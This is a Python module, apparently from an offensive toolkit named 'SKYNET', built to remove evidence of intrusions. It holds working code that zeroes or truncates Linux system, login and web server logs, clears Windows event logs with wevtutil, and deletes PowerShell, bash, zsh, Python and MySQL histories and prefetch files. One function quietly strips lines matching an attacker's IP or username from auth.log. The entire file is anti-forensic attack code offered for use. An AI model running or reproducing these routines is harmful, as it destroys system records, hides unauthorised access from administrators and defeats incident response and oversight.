"""
SKYNET Evasion - Log Cleaning and Evidence Removal

Anti-forensic log cleaning capabilities.

Clearance Level: Alpha-Black (Anti-Forensic Operations Authority)
Specialization: Evidence removal and log manipulation
Mission: Remove traces of SKYNET operations

This module provides:
- Linux log cleaning (/var/log/*, bash_history, etc.)
- Windows Event Log clearing
- Web server log cleaning
- Command history removal
- Selective log editing (stealth mode)
"""

import glob
import os
import subprocess
from typing import Any, Dict, List, Optional


def clean_linux_logs(
    comprehensive: bool = True,
    specific_logs: Optional[List[str]] = None,
    preserve_size: bool = True,
) -> Dict[str, Any]:
    """
    Clean Linux system logs to remove operation traces.

    Cleans:
    - /var/log/* (auth.log, syslog, messages, etc.)
    - ~/.bash_history, ~/.zsh_history
    - /var/log/apache2/, /var/log/nginx/
    - utmp, wtmp, btmp (login records)
    - lastlog

    Args:
        comprehensive: Clean all logs vs specific ones
        specific_logs: List of specific log files to clean
        preserve_size: Keep file sizes same (stealth)

    Returns:
        Dictionary with cleaned logs list

    Example:
        >>> # Clean all logs
        >>> result = clean_linux_logs(comprehensive=True)
        >>> print(f"Cleaned {result['logs_cleaned']} log files")

        >>> # Clean specific logs only
        >>> result = clean_linux_logs(
        ...     comprehensive=False,
        ...     specific_logs=["/var/log/auth.log", "/var/log/syslog"]
        ... )

    Warning:
        - Requires root privileges
        - May trigger alerts if monitoring is active
        - Consider selective_log_edit() for stealth
    """
    results = {"logs_cleaned": 0, "files_modified": [], "success": False, "error": None}

    try:
        if comprehensive:
            log_patterns = [
                "/var/log/auth.log*",
                "/var/log/syslog*",
                "/var/log/messages*",
                "/var/log/secure*",
                "/var/log/apache2/*",
                "/var/log/nginx/*",
                "/var/log/kern.log*",
                "/root/.bash_history",
                "/home/*/.bash_history",
                "/home/*/.zsh_history",
            ]
        else:
            log_patterns = specific_logs or []

        for pattern in log_patterns:
            for log_file in glob.glob(pattern):
                try:
                    if preserve_size:
                        # Get original size
                        size = os.path.getsize(log_file)
                        # Overwrite with zeros
                        with open(log_file, "wb") as f:
                            f.write(b"\x00" * size)
                    else:
                        # Truncate file
                        with open(log_file, "w") as f:
                            f.write("")

                    results["files_modified"].append(log_file)
                    results["logs_cleaned"] += 1
                except Exception:
                    pass

        # Clean wtmp, utmp, btmp
        for log in ["/var/log/wtmp", "/var/log/utmp", "/var/log/btmp", "/var/log/lastlog"]:
            try:
                if os.path.exists(log):
                    subprocess.run(["truncate", "-s", "0", log], check=True)
                    results["files_modified"].append(log)
                    results["logs_cleaned"] += 1
            except:
                pass

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def clean_windows_logs(
    event_logs: bool = True, powershell_history: bool = True, prefetch: bool = True
) -> Dict[str, Any]:
    """
    Clean Windows logs and evidence.

    Cleans:
    - Windows Event Logs (Security, System, Application)
    - PowerShell history
    - Prefetch files
    - Recent documents
    - Jump lists

    Example:
        >>> result = clean_windows_logs(
        ...     event_logs=True,
        ...     powershell_history=True,
        ...     prefetch=True
        ... )
    """
    results = {"logs_cleaned": 0, "success": False, "error": None}

    try:
        if event_logs:
            # Clear Windows Event Logs
            event_log_names = ["Security", "System", "Application", "Setup"]

            for log_name in event_log_names:
                try:
                    subprocess.run(["wevtutil", "cl", log_name], capture_output=True, check=True)
                    results["logs_cleaned"] += 1
                except:
                    pass

        if powershell_history:
            # Clear PowerShell history
            ps_history_paths = [
                os.path.expandvars(
                    r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
                ),
                os.path.expandvars(
                    r"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
                ),
            ]

            for path in ps_history_paths:
                try:
                    if os.path.exists(path):
                        os.remove(path)
                        results["logs_cleaned"] += 1
                except:
                    pass

        if prefetch:
            # Clear prefetch
            prefetch_path = r"C:\Windows\Prefetch\*"
            try:
                subprocess.run(["cmd", "/c", "del", "/f", "/q", prefetch_path], capture_output=True)
                results["logs_cleaned"] += 1
            except:
                pass

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def remove_command_history(
    bash: bool = True, zsh: bool = True, python: bool = True, mysql: bool = True
) -> Dict[str, Any]:
    """
    Remove command history files.

    Example:
        >>> result = remove_command_history()
        >>> print(f"Removed {result['histories_removed']} history files")
    """
    results = {"histories_removed": 0, "success": False, "error": None}

    try:
        history_files = []

        if bash:
            history_files.extend(["~/.bash_history", "/root/.bash_history"])

        if zsh:
            history_files.extend(["~/.zsh_history", "/root/.zsh_history"])

        if python:
            history_files.append("~/.python_history")

        if mysql:
            history_files.append("~/.mysql_history")

        for hist_file in history_files:
            expanded = os.path.expanduser(hist_file)
            try:
                if os.path.exists(expanded):
                    os.remove(expanded)
                    results["histories_removed"] += 1
            except:
                pass

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def selective_log_edit(
    log_file: str, patterns_to_remove: List[str], backup: bool = False
) -> Dict[str, Any]:
    """
    Selectively edit logs to remove specific entries (stealth mode).

    More stealthy than wiping entire logs - only removes specific patterns.

    Args:
        log_file: Path to log file
        patterns_to_remove: List of patterns/strings to remove
        backup: Create backup before editing

    Example:
        >>> # Remove only lines mentioning your IP
        >>> result = selective_log_edit(
        ...     log_file="/var/log/auth.log",
        ...     patterns_to_remove=["10.10.14.5", "attacker_user"]
        ... )
    """
    results = {"lines_removed": 0, "success": False, "error": None}

    try:
        if backup:
            import shutil

            shutil.copy2(log_file, f"{log_file}.bak")

        # Read log file
        with open(log_file) as f:
            lines = f.readlines()

        # Filter out lines containing patterns
        filtered_lines = []
        for line in lines:
            should_remove = False
            for pattern in patterns_to_remove:
                if pattern in line:
                    should_remove = True
                    results["lines_removed"] += 1
                    break

            if not should_remove:
                filtered_lines.append(line)

        # Write back
        with open(log_file, "w") as f:
            f.writelines(filtered_lines)

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def clear_web_logs(apache: bool = True, nginx: bool = True, iis: bool = True) -> Dict[str, Any]:
    """
    Clear web server logs.

    Example:
        >>> result = clear_web_logs(apache=True, nginx=True)
    """
    results = {"logs_cleared": 0, "success": False, "error": None}

    try:
        if apache:
            apache_logs = glob.glob("/var/log/apache2/*")
            for log in apache_logs:
                try:
                    with open(log, "w") as f:
                        f.write("")
                    results["logs_cleared"] += 1
                except:
                    pass

        if nginx:
            nginx_logs = glob.glob("/var/log/nginx/*")
            for log in nginx_logs:
                try:
                    with open(log, "w") as f:
                        f.write("")
                    results["logs_cleared"] += 1
                except:
                    pass

        if iis:
            # Windows IIS logs
            iis_paths = [
                r"C:\inetpub\logs\LogFiles\*\*.log",
                r"%SystemDrive%\inetpub\logs\LogFiles\*\*.log",
            ]

            for pattern in iis_paths:
                for log in glob.glob(os.path.expandvars(pattern)):
                    try:
                        os.remove(log)
                        results["logs_cleared"] += 1
                    except:
                        pass

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
